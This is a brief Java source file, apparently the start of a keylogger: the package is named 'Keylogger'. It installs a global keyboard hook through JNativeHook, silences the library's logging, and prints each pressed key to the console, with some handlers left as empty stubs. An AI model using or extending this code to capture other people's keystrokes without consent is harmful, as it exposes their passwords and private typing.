package Keylogger;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.*;

import java.util.logging.Handler;
import java.util.logging.Level;
import java.util.logging.Logger;


public class Client implements NativeKeyListener {
    public static void main(String[] args) {
        try {
            GlobalScreen.registerNativeHook();
        }
        catch (NativeHookException ex) {
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());
            System.exit(1);
        }
        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);
        Handler[] handlers = Logger.getLogger("").getHandlers();
        for (int i = 0; i < handlers.length; i++) {
            handlers[i].setLevel(Level.OFF);
        }
        setUpKeybinds();
        GlobalScreen.addNativeKeyListener(new Client());
    }

    private static void setUpKeybinds() {

    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent arg0) {

    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        System.out.println("Pressed " + NativeKeyEvent.getKeyText(e.getKeyCode()).toLowerCase());
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        //System.out.println("Released " + NativeKeyEvent.getKeyText(e.getKeyCode()).toLowerCase());
    }
}//